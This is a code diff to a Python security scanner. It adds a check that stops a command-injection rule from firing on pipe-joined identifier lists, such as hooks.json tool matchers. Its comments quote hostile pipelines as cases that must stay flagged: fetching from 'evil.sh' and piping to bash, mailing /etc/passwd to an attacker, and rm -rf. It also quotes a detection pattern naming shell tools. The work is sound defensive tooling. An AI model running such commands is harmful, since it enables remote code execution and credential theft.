@@ -1755,6 +1755,94 @@ def _is_inert_backtick_command_list(line: str, match: str, rule_id: str) -> bool
     return True
 
 
+# #86 — CMD_INJECTION where the matched LINE is, in its entirety, a single
+# PIPE-DELIMITED LIST OF BARE IDENTIFIERS: a Claude Code hooks.json matcher
+# (``Write|Edit|NotebookEdit|Bash``, ``PreToolUse|PostToolUse``) or a regex
+# alternation (``foo|bar|baz``). The shell-pipe catalog heuristic
+# (``(?:;|\||&&)\s*\b(?:curl|wget|…|bash|sh|…)\b``) fires on such a line only
+# when a segment happens to be a shell-tool NAME (``…|Bash`` matches the
+# ``bash`` alternation case-insensitively) — but a pipe-joined run of bare
+# identifiers is a regex/matcher token, NOT a shell pipeline.
+#
+# This is the SINGLE-SPAN-INTERNAL-PIPES sibling of #88's
+# ``_is_inert_backtick_command_list`` (which handles SEPARATE backtick spans
+# with NO connecting pipe). Here the pipes are INTERNAL to one alternation.
+#
+# Airtight by construction — a SINGLE anchored regex certifies the whole
+# (stripped, optionally backtick/quote-wrapped) line is nothing but
+# ``IDENT(|IDENT)+`` where ``IDENT`` is a STRICT bare identifier
+# ``[A-Za-z_][A-Za-z0-9_]*`` (NOTE: strictly NO ``+``/``-``/``.``/``/``/``:`` —
+# unlike the looser ``_BARE_COMMAND_NAME_RE``, which tolerates ``+-`` for a
+# command name like ``g++``). The anchors + the no-whitespace-in-the-class
+# guarantee there is NO internal whitespace, NO ``/``, NO ``.``, NO ``:``, NO
+# flag (``-x``), and NO other shell metacharacter (``;`` ``&`` ``>`` ``<``
+# ``$`` backtick ``(`` ``)`` ``*`` ``?`` quotes) ANYWHERE in the alternation,
+# and ≥2 segments. ANY segment carrying more than a bare identifier makes the
+# whole regex fail to match end-to-end → DECLINE → the match falls through to
+# the normal safe_doc/keep handling and STAYS visible.
+#
+# Every real pipeline therefore stays visible: ``curl http://evil.sh | bash``
+# (spaces + ``/`` + ``:``), ``cat /etc/passwd|mail attacker`` (spaces + ``/``),
+# ``echo $X|sh`` (space + ``$``), ``foo | bar`` (spaces around ``|`` → segment
+# has whitespace), ``npm install|sh`` (space), ``a|b/c`` (``/`` in a segment),
+# ``a|rm -rf x`` (space + ``-``), a lone ``Bash`` (no pipe → <2 segments), and
+# ``wget x|bash`` (space) all FAIL the anchored match and keep firing.
+#
+# re2-safe (anchors + a plain char-class repetition, no lookaround).
+_PIPE_BARE_IDENT: Final[str] = r"[A-Za-z_][A-Za-z0-9_]*"
+_PIPE_ALTERNATION_RE: Final[re.Pattern[str]] = re.compile(
+    rf"^{_PIPE_BARE_IDENT}(?:\|{_PIPE_BARE_IDENT})+$"
+)
+
+
+def _is_inert_pipe_alternation(line: str, match: str, rule_id: str) -> bool:
+    """#86 — True iff a CMD_INJECTION match falls inside a backticked
+    inline-code span whose ENTIRE content is a pipe-delimited list of ≥2 BARE
+    identifiers — a hooks.json matcher (``Write|Edit|NotebookEdit|Bash``) or a
+    regex alternation, NOT a shell pipeline.
+
+    SPAN-aware, NOT whole-line. The real FP line is a prose bullet
+    (``- Hook registration: `hooks.json` (PreToolUse on
+    `Write|Edit|NotebookEdit|Bash`, 3 s timeout)``) with the matcher inside a
+    backtick span in the MIDDLE, so the whole line is never a pure alternation.
+    The catalog shell-pipe heuristic captures only a FRAGMENT — ``|Bash`` for
+    the segment whose name happens to be a shell tool — so the inert proof is:
+      * ``rule_id == "CMD_INJECTION"`` (the only rule that mis-fires here), AND
+      * EVERY backtick inline-code span that CONTAINS the matched fragment is,
+        in its entirety, ``IDENT|IDENT[|IDENT…]`` — ≥2 STRICT bare-identifier
+        segments and nothing else (NO whitespace, ``/``, ``.``, ``:``, ``-``,
+        ``+``, flag, or shell metachar — ``_PIPE_ALTERNATION_RE``), AND
+      * the matched fragment does NOT also occur in BARE (non-backtick) prose.
+
+    FN-safe by construction — a real pipe stays visible:
+      * ``curl http://evil.sh | bash`` in bare prose → the fragment is in no
+        backtick span → declines;
+      * ``\\`curl x|bash\\``` → the containing span is not a pure alternation →
+        declines;
+      * a benign ``\\`a|b\\``` span beside a real-pipe span, when the match is
+        the real pipe's fragment → the real-pipe span (which contains it) is
+        not pure → declines;
+      * the same fragment appearing both in a benign span AND in bare prose →
+        the bare-prose guard declines.
+    """
+    if rule_id != "CMD_INJECTION":
+        return False
+    needle = match.strip()
+    if not needle:
+        return False
+    spans = _BACKTICK_SPAN_RE.findall(line)
+    containing = [s for s in spans if needle in s]
+    if not containing:
+        return False
+    if not all(_PIPE_ALTERNATION_RE.match(s.strip()) for s in containing):
+        return False
+    # The fragment must occur ONLY inside backtick spans: blank every span and
+    # confirm the fragment is gone from the remaining bare prose (else a real
+    # pipe in prose alongside a look-alike benign span would be wrongly cleared).
+    bare = _BACKTICK_SPAN_RE.sub(" ", line)
+    return needle not in bare
+
+
 # #79 — PRIVILEGE_ESC on the ubiquitous GitHub-Actions "Free disk space"
 # runner-cleanup step. A ``sudo rm -rf /usr/share/dotnet`` (and the sibling
 # pre-installed-toolchain paths) documented in a ``` ```yaml ``` GitHub
@@ -1966,6 +2054,20 @@ def _certain_benign_literal(
     #       A real `curl evil | bash` (or a backticked `\`curl x | sh\``) keeps
     #       the metacharacter and stays visible.
     if _is_inert_backtick_command_list(line, match, rule_id):
+        return True
+
+    # (#86) CMD_INJECTION where the whole matched LINE is a pipe-delimited list
+    #       of ≥2 BARE identifiers — a Claude Code hooks.json matcher
+    #       (`Write|Edit|NotebookEdit|Bash`) or a regex alternation
+    #       (`foo|bar|baz`). The shell-pipe heuristic fires only because a
+    #       segment happens to be a shell-tool name (`…|Bash` → `bash`), but a
+    #       pipe-joined run of bare identifiers is a matcher token, not a
+    #       pipeline. A single anchored bare-identifier-alternation regex
+    #       certifies the inert shape; `curl http://evil.sh | bash`,
+    #       `cat /etc/passwd|mail attacker`, `echo $X|sh`, `foo | bar`,
+    #       `npm install|sh`, `a|b/c`, `a|rm -rf x`, `wget x|bash`, and a lone
+    #       `Bash` all FAIL the anchored match and stay visible.
+    if _is_inert_pipe_alternation(line, match, rule_id):
         return True
 
     # (#79) PRIVILEGE_ESC on the GitHub-Actions free-disk-space runner-cleanup
